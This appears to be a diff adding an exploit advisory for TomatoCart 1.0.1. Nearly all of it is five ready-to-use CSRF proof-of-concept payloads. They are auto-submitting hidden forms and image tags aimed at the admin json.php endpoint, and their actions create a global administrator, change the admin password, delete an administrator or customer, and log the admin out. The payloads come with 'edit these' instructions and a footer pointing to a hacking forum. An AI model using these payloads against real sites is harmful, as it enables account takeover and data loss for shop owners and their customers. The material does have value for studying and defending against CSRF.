@@ -1,0 +1,67 @@
+<!---
+    Title: TomatoCart 1.0.1 Multiple CSRF Vulnerabilities
+    Author: 10n1z3d <10n1z3d[at]w[dot]cn>
+    Date: Sun 11 Jul 2010 05:01:51 PM EEST 
+    Vendor: http://www.tomatocart.com/
+    Download: http://www.tomatocart.com/component/extension_manage/?task=downloadfiles&file=tomatocart-1.0.1.zip
+--->
+
+-=[ CSRF PoC 1 - Create Admin User ]=-
+
+    <html>
+        <head>
+            <title>TomatoCart 1.0.1 Multiple CSRF Vulnerabilities - Create Admin User</title>
+        </head>
+        <body onload="document.csrf.submit();">
+            <!--- Note: GET requests work too --->
+            <form name="csrf" action="http://[domain]/admin/json.php" method="post">
+                <!--- Edit these --->
+                <input type="hidden" name="user_name" value="root" />
+                <input type="hidden" name="user_password" value="rootroot" />
+                <input type="hidden" name="email_address" value="root@root.com" />
+                <!--- Do not edit below --->
+                <input type="hidden" name="module" value="administrators" />
+                <input type="hidden" name="action" value="save_administrator" />
+                <input type="hidden" name="access_globaladmin" value="on" />
+            </form>
+        </body>
+    </html>
+    
+-=[ CSRF PoC 2 - Change Admin Password ]=-
+    
+    <html>
+        <head>
+            <title>TomatoCart 1.0.1 Multiple CSRF Vulnerabilities - Change Admin Password</title>
+        </head>
+        <body onload="document.csrf.submit();">
+            <!--- Note: GET requests work too --->
+            <form name="csrf" action="http://[domain]/admin/json.php" method="post">
+                <!--- Edit these --->
+                <input type="hidden" name="user_password" value="rootroot" />
+                <input type="hidden" name="email_address" value="root@root.com" />
+                <!--- Do not edit below --->
+                <input type="hidden" name="user_name" value="admin" />
+                <input type="hidden" name="aID" value="1" />
+                <input type="hidden" name="module" value="administrators" />
+                <input type="hidden" name="action" value="save_administrator" />
+                <input type="hidden" name="access_globaladmin" value="on" />
+            </form>
+        </body>
+    </html>  
+    
+ -=[ CSRF PoC 3 - Delete Administrator ]=-
+ 
+    <img src="http://[domain]/admin/json.php?module=administrators&action=delete_administrator&adminId=2" alt="Do you see this?" />
+ 
+ -=[ CSRF PoC 4 - Delete Customer ]=-
+
+    <img src="http://[domain]/admin/json.php?module=customers&action=delete_customer&customers_id=1" alt="Do you see this?" />
+ 
+-=[ CSRF PoC 5 - Logout The Administrator ]=-
+
+    <img src="http://[domain]/admin/json.php?module=login&action=logoff" alt="Do you see this?" />  
+
+<!---
+    http://www.evilzone.org/
+    irc.evilzone.org  (6697 / 9999)
+--->
